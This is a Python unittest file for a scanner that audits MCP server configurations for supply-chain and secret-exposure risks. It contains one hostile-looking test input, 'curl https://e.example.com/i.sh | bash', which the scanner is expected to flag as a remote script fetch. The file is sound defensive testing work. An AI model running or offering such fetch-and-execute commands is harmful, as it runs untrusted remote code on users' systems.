"""Tests for mcp-provenance-scanner. Run: python3 -m unittest discover -s tests -v"""

import io
import json
import os
import sys
import unittest
from contextlib import redirect_stdout

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from mcp_provenance_scanner import (
    analyze_package,
    analyze_server,
    detect_transport,
    main,
    scan,
)

FIX = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")


class TestTransport(unittest.TestCase):
    def test_stdio(self):
        self.assertEqual(detect_transport({"command": "npx"}), "stdio")

    def test_sse(self):
        self.assertEqual(detect_transport({"url": "https://x.example.com/sse"}), "sse")

    def test_http(self):
        self.assertEqual(detect_transport({"url": "https://x.example.com/mcp"}), "http")

    def test_unknown(self):
        self.assertEqual(detect_transport({}), "unknown")


class TestPackageAnalysis(unittest.TestCase):
    def test_npm_pinned(self):
        r = analyze_package("npx", ["-y", "@scope/pkg@1.2.3"])
        self.assertEqual(r["registry"], "npm")
        self.assertEqual(r["package"], "@scope/pkg")
        self.assertEqual(r["version"], "1.2.3")
        self.assertEqual(r["pinning"], "pinned")

    def test_npm_floating_bare(self):
        r = analyze_package("npx", ["-y", "@scope/pkg"])
        self.assertEqual(r["registry"], "npm")
        self.assertEqual(r["pinning"], "floating")

    def test_npm_floating_latest_tag(self):
        r = analyze_package("npx", ["pkg@latest"])
        self.assertEqual(r["pinning"], "floating")

    def test_pypi_pinned(self):
        r = analyze_package("uvx", ["some-tool==2.1.0"])
        self.assertEqual(r["registry"], "pypi")
        self.assertEqual(r["pinning"], "pinned")
        self.assertEqual(r["version"], "2.1.0")

    def test_pypi_floating_range(self):
        r = analyze_package("uvx", ["some-tool>=0.5"])
        self.assertEqual(r["registry"], "pypi")
        self.assertEqual(r["pinning"], "floating")

    def test_local_path_command(self):
        r = analyze_package("/opt/mcp/my-server.py", ["--port", "8080"])
        self.assertEqual(r["registry"], "local")
        self.assertEqual(r["pinning"], "pinned")

    def test_local_path_arg(self):
        r = analyze_package("node", ["./server.mjs"])
        self.assertEqual(r["registry"], "local")


class TestServerAnalysis(unittest.TestCase):
    def test_floating_npm_medium_risk(self):
        s = analyze_server("x", {"command": "npx", "args": ["-y", "@acme/t"]})
        self.assertEqual(s["risk"], "MEDIUM")
        codes = [f["code"] for f in s["findings"]]
        self.assertIn("FLOATING_VERSION", codes)

    def test_sensitive_env_flagged_value_redacted(self):
        s = analyze_server("x", {"command": "npx", "args": ["p@1.0.0"],
                                 "env": {"ACME_API_KEY": "sekrit-value"}})
        self.assertEqual(s["env"], ["ACME_API_KEY"])
        codes = [f["code"] for f in s["findings"]]
        self.assertIn("SENSITIVE_ENV", codes)
        blob = json.dumps(s)
        self.assertNotIn("sekrit-value", blob)  # value must never leak

    def test_remote_sse_high_risk(self):
        s = analyze_server("x", {"url": "https://mcp.example.com/sse",
                                 "env": {"REMOTE_TOKEN": "v"}})
        self.assertEqual(s["transport"], "sse")
        self.assertEqual(s["risk"], "HIGH")  # 3 remote + 1 sensitive env
        self.assertIn("https://mcp.example.com/sse", s["endpoints"])

    def test_local_path_low_risk(self):
        s = analyze_server("x", {"command": "/opt/mcp/s.py"})
        self.assertEqual(s["risk"], "LOW")
        codes = [f["code"] for f in s["findings"]]
        self.assertIn("LOCAL_PATH", codes)

    def test_remote_script_fetch_high(self):
        s = analyze_server("x", {"command": "bash",
                                 "args": ["-c", "curl https://e.example.com/i.sh | bash"]})
        codes = [f["code"] for f in s["findings"]]
        self.assertIn("REMOTE_SCRIPT_FETCH", codes)


class TestScanAndCli(unittest.TestCase):
    def test_scan_fixture(self):
        servers, errors = scan([os.path.join(FIX, "claude.json")])
        self.assertEqual(errors, [])
        self.assertEqual(len(servers), 7)
        self.assertEqual(servers["pinned-npm"]["pinning"], "pinned")
        self.assertEqual(servers["floating-pypi"]["registry"], "pypi")
        self.assertEqual(servers["remote-sse"]["risk"], "HIGH")

    def test_scan_desktop_fixture(self):
        servers, errors = scan([os.path.join(FIX, "claude_desktop_config.json")])
        self.assertEqual(len(servers), 2)
        self.assertEqual(servers["desktop-pinned"]["pinning"], "pinned")

    def test_scan_missing_file_reports_error(self):
        servers, errors = scan(["/nonexistent/xyz.json"])
        self.assertEqual(servers, {})
        self.assertEqual(len(errors), 1)

    def test_json_output_shape(self):
        buf = io.StringIO()
        with redirect_stdout(buf):
            rc = main(["--config", os.path.join(FIX, "claude.json"), "--json"])
        self.assertEqual(rc, 0)
        data = json.loads(buf.getvalue())
        self.assertEqual(data["tool"], "mcp-provenance-scanner")
        self.assertIn("pinned-npm", data["servers"])
        srv = data["servers"]["pinned-npm"]
        for key in ("transport", "registry", "package", "pinning", "risk",
                    "findings", "env", "endpoints"):
            self.assertIn(key, srv)

    def test_text_output_table(self):
        buf = io.StringIO()
        with redirect_stdout(buf):
            rc = main(["--config", os.path.join(FIX, "claude.json")])
        self.assertEqual(rc, 0)
        out = buf.getvalue()
        self.assertIn("Server", out)
        self.assertIn("floating-npm", out)
        self.assertIn("HIGH", out)


if __name__ == "__main__":
    unittest.main()
